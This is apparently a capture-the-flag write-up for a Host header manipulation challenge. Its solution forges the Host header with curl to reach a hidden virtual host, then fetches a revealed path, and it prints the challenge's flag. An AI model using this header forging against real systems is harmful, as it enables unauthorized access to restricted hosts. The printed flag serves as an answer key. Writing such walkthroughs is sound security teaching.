# Research Materials

**Challenge Type: HTTP Host Header Manipulation**
**Challenge Status: Unsolved**

## Challenge

You want to get the research materials and find out which part of the development goes wrong. The research materials are hidden in the system topsecret.vaccine.dev. How do you get it?  
**Note: All 403s for this challenge are intended. We've tested it.**  
http://research.nypinfsecctf.tk/

## Solution

1. Manipulate the `Host` header
```bash
$ curl --header "Host: topsecret.vaccine.dev" http://research.nypinfsecctf.tk/

/f/Evommgb5azlyCaYMDHW57Q
```

2. Follow the link
```bash
$ curl http://research.nypinfsecctf.tk/f/Evommgb5azlyCaYMDHW57Q

NYP{h0st_h3ad3r_f0rg1ng}
```
